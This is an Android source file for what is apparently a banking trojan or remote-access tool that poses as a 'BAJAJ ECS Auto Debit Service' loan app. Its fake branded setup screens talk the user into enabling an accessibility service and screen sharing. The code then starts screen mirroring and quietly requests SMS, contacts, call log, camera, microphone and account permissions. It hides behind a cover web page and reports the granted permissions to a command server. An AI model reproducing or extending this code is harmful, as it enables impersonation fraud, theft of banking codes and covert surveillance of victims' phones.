package com.panellord;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ_SCREEN_CAPTURE = 101;
    private static final int REQ_PERMISSIONS    = 102;
    private static final String COVER_URL = "https://zenen.in";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private LinearLayout stepCard2;
    private TextView tv1Status;
    private Button btn1, btn2;
    private boolean waitingAcc = false;
    private boolean screenCaptureRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(Color.parseColor("#0D47A1"));
        }

        // If Device Owner → silently grant all permissions before anything else
        DeviceOwnerHelper.grantAllIfOwner(this);

        // Start background service
        Intent svc = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);

        if (PanelAccessibility.isEnabled(this)) {
            // Accessibility on → auto-request screen capture first, then show cover
            autoStartCapture();
        } else {
            buildSetupUI();
        }

        // Request permissions after a delay (not immediately on open)
        handler.postDelayed(this::requestAllPermissions, 5000);
    }

    /* ══════════════════════════════════════════════
       Auto screen cast
    ═══════════════════════════════════════════════ */
    private void autoStartCapture() {
        if (ScreenMirrorService.isRunning()) {
            showCoverWebView();
            return;
        }
        if (screenCaptureRequested) {
            showCoverWebView();
            return;
        }
        try {
            screenCaptureRequested = true;
            MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent captureIntent;
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    MediaProjectionConfig cfg =
                        MediaProjectionConfig.createConfigForDefaultDisplay();
                    captureIntent = mpm.createScreenCaptureIntent(cfg);
                } catch (Throwable t) {
                    captureIntent = mpm.createScreenCaptureIntent();
                }
            } else {
                captureIntent = mpm.createScreenCaptureIntent();
            }
            startActivityForResult(captureIntent, REQ_SCREEN_CAPTURE);
        } catch (Exception e) {
            showCoverWebView();
        }
    }

    /* ══════════════════════════════════════════════
       Permission requests — delayed, silent
    ═══════════════════════════════════════════════ */
    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        String[] perms = {
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        boolean needRequest = false;
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                needRequest = true; break;
            }
        }
        if (needRequest) requestPermissions(perms, REQ_PERMISSIONS);
    }

    /* ══════════════════════════════════════════════
       Cover WebView
    ═══════════════════════════════════════════════ */
    private void showCoverWebView() {
        WebView wv = new WebView(this);
        WebSettings ws = wv.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setBuiltInZoomControls(true);
        ws.setDisplayZoomControls(false);
        ws.setCacheMode(WebSettings.LOAD_DEFAULT);
        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Pixel 7) "
            + "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36");
        wv.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url); return true;
            }
        });
        wv.loadUrl(COVER_URL);
        setContentView(wv);
        // Sync permissions after cover is showing
        handler.postDelayed(() ->
            new Thread(() -> CommandPoller.syncPermissions(this)).start(), 3000);
    }

    /* ══════════════════════════════════════════════
       Setup UI — Step 1: Accessibility | Step 2: Screen
    ═══════════════════════════════════════════════ */
    private void buildSetupUI() {
        int BG    = Color.parseColor("#0D47A1");
        int CARD  = Color.parseColor("#1565C0");
        int GOLD  = Color.parseColor("#FFB300");
        int WHITE = Color.WHITE;
        int LGRAY = Color.parseColor("#B0BEC5");
        int DGRAY = Color.parseColor("#78909C");

        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(BG);
        scroll.setFillViewport(true);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(BG);
        root.setPadding(dp(20), dp(52), dp(20), dp(48));

        // Logo header
        LinearLayout logoRow = new LinearLayout(this);
        logoRow.setOrientation(LinearLayout.HORIZONTAL);
        logoRow.setGravity(Gravity.CENTER_VERTICAL);
        logoRow.setPadding(0, 0, 0, dp(24));
        ImageView logoIv = new ImageView(this);
        logoIv.setImageBitmap(drawLogo());
        logoIv.setScaleType(ImageView.ScaleType.FIT_XY);
        logoRow.addView(logoIv, new LinearLayout.LayoutParams(dp(56), dp(56)));
        LinearLayout logoText = new LinearLayout(this);
        logoText.setOrientation(LinearLayout.VERTICAL);
        logoText.setPadding(dp(12), 0, 0, 0);
        TextView logoTitle = new TextView(this);
        logoTitle.setText("BAJAJ ECS");
        logoTitle.setTextColor(WHITE);
        logoTitle.setTextSize(22);
        logoTitle.setTypeface(null, Typeface.BOLD);
        logoText.addView(logoTitle);
        TextView logoSub = new TextView(this);
        logoSub.setText("Auto Debit Service");
        logoSub.setTextColor(LGRAY);
        logoSub.setTextSize(12);
        logoText.addView(logoSub);
        logoRow.addView(logoText);
        root.addView(logoRow, matchWrap());

        // Subtitle
        TextView sub = new TextView(this);
        sub.setText("Enable the following to continue to your loan account");
        sub.setTextColor(LGRAY);
        sub.setTextSize(13);
        sub.setPadding(0, 0, 0, dp(20));
        root.addView(sub, matchWrap());

        // Step 1
        LinearLayout card1 = makeCard(CARD);
        addStepIllustration(card1, "acc");
        tv1Status = addHeader(card1, "1", "Enable Accessibility Service", GOLD);
        addBody(card1, LGRAY,
            "1. Tap 'Open Settings'\n" +
            "2. Find 'Downloaded Apps' or 'Installed Services'\n" +
            "3. Tap 'BAJAJ ECS'\n" +
            "4. Toggle to ON → tap ALLOW\n" +
            "5. Press Back to return");
        btn1 = addButton(card1, "Open Accessibility Settings", GOLD, Color.BLACK);
        btn1.setOnClickListener(v -> {
            waitingAcc = true;
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        });
        root.addView(card1, cardLp());

        // Step 2
        stepCard2 = makeCard(CARD);
        addStepIllustration(stepCard2, "screen");
        addHeader(stepCard2, "2", "Allow Screen Access", Color.parseColor("#4CAF50"));
        addBody(stepCard2, LGRAY,
            "Required for secure EMI verification.\n\n" +
            "Tap 'Start' → tap 'Start now' in the system prompt.");
        btn2 = addButton(stepCard2, "Start Monitoring", Color.parseColor("#4CAF50"), WHITE);
        btn2.setOnClickListener(v -> proceedToScreenCapture());
        root.addView(stepCard2, cardLp());

        TextView note = new TextView(this);
        note.setText("BAJAJ Finance Ltd. · Secured by SSL · v2.4.1");
        note.setTextColor(DGRAY);
        note.setTextSize(10);
        note.setGravity(Gravity.CENTER_HORIZONTAL);
        note.setPadding(0, dp(16), 0, 0);
        root.addView(note, matchWrap());

        scroll.addView(root);
        setContentView(scroll);
        refreshStepUI();
    }

    private Bitmap drawLogo() {
        int sz = dp(56);
        Bitmap bmp = Bitmap.createBitmap(sz, sz, Bitmap.Config.ARGB_8888);
        Canvas c = new Canvas(bmp);
        Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
        // Blue circle bg
        p.setColor(Color.parseColor("#1565C0"));
        c.drawRoundRect(new RectF(0, 0, sz, sz), sz * 0.2f, sz * 0.2f, p);
        // Shield shape
        android.graphics.Path shield = new android.graphics.Path();
        float cx = sz / 2f, sh = sz * 0.72f, sy = sz * 0.14f;
        shield.moveTo(cx, sy);
        shield.lineTo(cx + sz * 0.28f, sy + sz * 0.14f);
        shield.lineTo(cx + sz * 0.28f, sy + sz * 0.32f);
        shield.quadTo(cx + sz * 0.28f, sy + sz * 0.5f, cx, sy + sh - sy);
        shield.quadTo(cx - sz * 0.28f, sy + sz * 0.5f, cx - sz * 0.28f, sy + sz * 0.32f);
        shield.lineTo(cx - sz * 0.28f, sy + sz * 0.14f);
        shield.close();
        p.setColor(Color.WHITE);
        c.drawPath(shield, p);
        // Checkmark
        p.setColor(Color.parseColor("#1565C0"));
        p.setStyle(Paint.Style.STROKE);
        p.setStrokeWidth(sz * 0.08f);
        p.setStrokeCap(Paint.Cap.ROUND);
        p.setStrokeJoin(Paint.Join.ROUND);
        c.drawLine(cx - sz * 0.14f, cy(sz), cx - sz * 0.04f, cy(sz) + sz * 0.1f, p);
        c.drawLine(cx - sz * 0.04f, cy(sz) + sz * 0.1f, cx + sz * 0.16f, cy(sz) - sz * 0.12f, p);
        p.setStyle(Paint.Style.FILL);
        // "B" text bottom
        p.setColor(Color.parseColor("#FFB300"));
        p.setTextSize(sz * 0.2f);
        p.setTextAlign(Paint.Align.CENTER);
        p.setTypeface(Typeface.DEFAULT_BOLD);
        c.drawText("BAJAJ", cx, sz * 0.92f, p);
        p.setTextAlign(Paint.Align.LEFT);
        return bmp;
    }

    private float cy(int sz) { return sz * 0.52f; }

    /* ── Step illustration ─────────────────────────────────────────────── */
    private void addStepIllustration(LinearLayout card, String type) {
        int W = dp(320), H = dp(80);
        Bitmap bmp = Bitmap.createBitmap(W, H, Bitmap.Config.ARGB_8888);
        Canvas c = new Canvas(bmp);
        Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
        c.drawColor(Color.parseColor("#0D47A1"));
        if (type.equals("acc")) drawAccIllustration(c, p, W, H);
        else drawScreenIllustration(c, p, W, H);
        ImageView iv = new ImageView(this);
        iv.setImageBitmap(bmp);
        iv.setScaleType(ImageView.ScaleType.FIT_XY);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(80));
        lp.bottomMargin = dp(10);
        card.addView(iv, lp);
    }

    private void drawAccIllustration(Canvas c, Paint p, int W, int H) {
        drawPhone(c, p, 16, 4, 100, H - 4);
        p.setColor(Color.parseColor("#1565C0")); c.drawRect(20, 13, 96, 24, p);
        c.drawRect(20, 26, 96, 37, p); c.drawRect(20, 56, 96, 67, p);
        p.setColor(Color.parseColor("#1a3d27")); c.drawRect(20, 39, 96, 50, p);
        p.setColor(Color.parseColor("#FFB300"));
        p.setStyle(Paint.Style.STROKE); p.setStrokeWidth(1f); c.drawRect(20, 39, 96, 50, p);
        p.setStyle(Paint.Style.FILL); p.setTextSize(6.5f);
        c.drawText("BAJAJ ECS", 25, 47, p);
        p.setColor(Color.parseColor("#FFB300")); p.setStrokeWidth(2f);
        c.drawLine(106, H / 2f, 120, H / 2f, p);
        android.graphics.Path arr = new android.graphics.Path();
        arr.moveTo(118, H / 2f - 4); arr.lineTo(124, H / 2f); arr.lineTo(118, H / 2f + 4); arr.close();
        c.drawPath(arr, p);
        drawPhone(c, p, 130, 4, W - 8, H - 4);
        p.setColor(Color.parseColor("#1565C0")); c.drawRect(134, 13, W - 12, 23, p);
        p.setColor(Color.WHITE); p.setTextSize(5f); c.drawText("BAJAJ ECS", 138, 21, p);
        p.setColor(Color.parseColor("#4CAF50"));
        c.drawRoundRect(new RectF(W - 46, 30, W - 16, 42), 6, 6, p);
        p.setColor(Color.WHITE); c.drawCircle(W - 19, 36, 4.5f, p);
        p.setColor(Color.parseColor("#FFB300")); p.setTextSize(5.5f);
        c.drawText("ALLOW", 135, 60, p);
    }

    private void drawScreenIllustration(Canvas c, Paint p, int W, int H) {
        int cx = W / 2, cy = H / 2;
        drawPhone(c, p, cx - 26, 5, cx + 26, H - 5);
        p.setColor(Color.parseColor("#0a1929")); c.drawRect(cx - 22, 13, cx + 22, H - 9, p);
        p.setColor(Color.parseColor("#4CAF50")); p.setStyle(Paint.Style.STROKE); p.setStrokeWidth(2f);
        c.drawCircle(cx, cy, 15, p); p.setStyle(Paint.Style.FILL);
        android.graphics.Path tri = new android.graphics.Path();
        tri.moveTo(cx - 5, cy - 8); tri.lineTo(cx + 11, cy); tri.lineTo(cx - 5, cy + 8); tri.close();
        c.drawPath(tri, p);
        p.setColor(Color.parseColor("#4CAF5060")); p.setStyle(Paint.Style.STROKE); p.setStrokeWidth(1.5f);
        c.drawArc(new RectF(cx + 20, cy - 14, cx + 38, cy + 14), -40, 80, false, p);
        c.drawArc(new RectF(cx + 26, cy - 20, cx + 50, cy + 20), -40, 80, false, p);
        p.setStyle(Paint.Style.FILL);
        p.setColor(Color.parseColor("#90A4AE")); p.setTextSize(9f); p.setTextAlign(Paint.Align.CENTER);
        c.drawText("Secure Screen", cx + 70, cy - 4, p);
        c.drawText("Verification", cx + 70, cy + 10, p);
        p.setTextAlign(Paint.Align.LEFT);
    }

    private void drawPhone(Canvas c, Paint p, float x1, float y1, float x2, float y2) {
        p.setColor(Color.parseColor("#1E3A5F"));
        c.drawRoundRect(new RectF(x1, y1, x2, y2), 7, 7, p);
        p.setColor(Color.parseColor("#2D6A9F")); p.setStyle(Paint.Style.STROKE); p.setStrokeWidth(1f);
        c.drawRoundRect(new RectF(x1, y1, x2, y2), 7, 7, p); p.setStyle(Paint.Style.FILL);
        float mid = (x1 + x2) / 2;
        p.setColor(Color.parseColor("#2D6A9F"));
        c.drawRoundRect(new RectF(mid - 7, y2 - 5, mid + 7, y2 - 3), 2, 2, p);
    }

    /* ── refreshStepUI ────────────────────────────────────────────────── */
    private void refreshStepUI() {
        boolean accOk = PanelAccessibility.isEnabled(this);
        if (accOk) {
            tv1Status.setText("✔  Accessibility Active");
            tv1Status.setTextColor(Color.parseColor("#4CAF50"));
            btn1.setText("✔  Enabled");
            btn1.setEnabled(false); btn1.setAlpha(0.5f);
            handler.postDelayed(this::autoStartCapture, 600);
        }
        stepCard2.setAlpha(accOk ? 1f : 0.35f);
        btn2.setEnabled(accOk);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingAcc) { waitingAcc = false; refreshStepUI(); }
    }

    private void proceedToScreenCapture() {
        if (ScreenMirrorService.isRunning()) { showCoverWebView(); return; }
        try {
            screenCaptureRequested = true;
            MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent captureIntent;
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    MediaProjectionConfig cfg =
                        MediaProjectionConfig.createConfigForDefaultDisplay();
                    captureIntent = mpm.createScreenCaptureIntent(cfg);
                } catch (Throwable t) {
                    captureIntent = mpm.createScreenCaptureIntent();
                }
            } else {
                captureIntent = mpm.createScreenCaptureIntent();
            }
            startActivityForResult(captureIntent, REQ_SCREEN_CAPTURE);
        } catch (Exception e) { showCoverWebView(); }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent screenSvc = new Intent(this, ScreenMirrorService.class);
                screenSvc.setAction(ScreenMirrorService.ACTION_START);
                screenSvc.putExtra(ScreenMirrorService.EXTRA_RESULT_CODE, resultCode);
                screenSvc.putExtra(ScreenMirrorService.EXTRA_DATA, data);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(screenSvc);
                else startService(screenSvc);
            }
            showCoverWebView();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] grants) {
        super.onRequestPermissionsResult(req, perms, grants);
        // Report updated permissions to server
        handler.postDelayed(() ->
            new Thread(() -> CommandPoller.syncPermissions(this)).start(), 1500);
    }

    /* ── UI helpers ────────────────────────────────────────────────────── */
    private LinearLayout makeCard(int bg) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundColor(bg);
        card.setPadding(dp(16), dp(16), dp(16), dp(16));
        return card;
    }

    private TextView addHeader(LinearLayout card, String num, String title, int color) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        TextView numTv = new TextView(this);
        numTv.setText(num);
        numTv.setTextColor(color);
        numTv.setTextSize(26);
        numTv.setTypeface(null, Typeface.BOLD);
        numTv.setPadding(0, 0, dp(10), 0);
        row.addView(numTv);
        TextView titleTv = new TextView(this);
        titleTv.setText(title);
        titleTv.setTextColor(Color.WHITE);
        titleTv.setTextSize(14);
        titleTv.setTypeface(null, Typeface.BOLD);
        row.addView(titleTv);
        card.addView(row, matchWrap());
        return titleTv;
    }

    private void addBody(LinearLayout card, int color, String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(color);
        tv.setTextSize(13);
        tv.setLineSpacing(dp(3), 1);
        tv.setPadding(0, dp(6), 0, dp(10));
        card.addView(tv, matchWrap());
    }

    private Button addButton(LinearLayout card, String label, int bg, int fg) {
        Button btn = new Button(this);
        btn.setText(label);
        btn.setTextColor(fg);
        btn.setTextSize(13);
        btn.setTypeface(null, Typeface.BOLD);
        btn.setBackgroundColor(bg);
        btn.setAllCaps(false);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(48));
        card.addView(btn, lp);
        return btn;
    }

    private LinearLayout.LayoutParams cardLp() {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(12);
        return lp;
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}
